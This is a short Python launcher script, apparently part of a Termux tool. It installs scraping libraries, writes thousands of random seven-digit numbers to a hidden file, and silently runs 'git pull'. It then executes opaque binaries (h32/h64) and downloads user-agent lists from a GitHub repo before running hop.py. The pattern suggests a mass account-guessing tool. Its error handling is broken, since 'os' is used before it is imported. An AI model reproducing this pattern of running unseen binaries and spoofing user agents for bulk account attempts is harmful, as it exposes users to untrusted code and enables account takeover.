#coding=utf-8
try:
    import os
    import sys
    import time
    import struct
    import requests
    import fake_useragent
    import bs4
    import random
except ModuleNotFoundError:
    os.system('pip install requests fake_useragent bs4 futures')
os.system('rm -rf .txt')
for x in range(4999):
    n = random.randint(1111111, 9999999)
    sys.stdout=open('.txt', 'a')
    print(n)
    sys.stdout.flush()
os.system('clear')
print('  \n\n\nGetting update ...')
time.sleep(0.5)
os.system('git pull')
os.system('clear')
x = str(struct.calcsize("P") * 8)
if os.path.isfile('user.txt'):
    if '32' in x:
        os.system('chmod +x h32 && ./h32')
    elif '64' in x:
        os.system('chmod +x h64 && ./h64')
    else:
        print('\n\n\n aarch cannot identified')
        os.sys.exit()
else:
    os.system('pkg update && curl -L https://raw.githubusercontent.com/Hamzahash/uagents/main/user.txt > user.txt')
    os.system('curl -L https://raw.githubusercontent.com/Hamzahash/uagents/main/agent.txt >> user.txt')
    os.system('python hop.py')
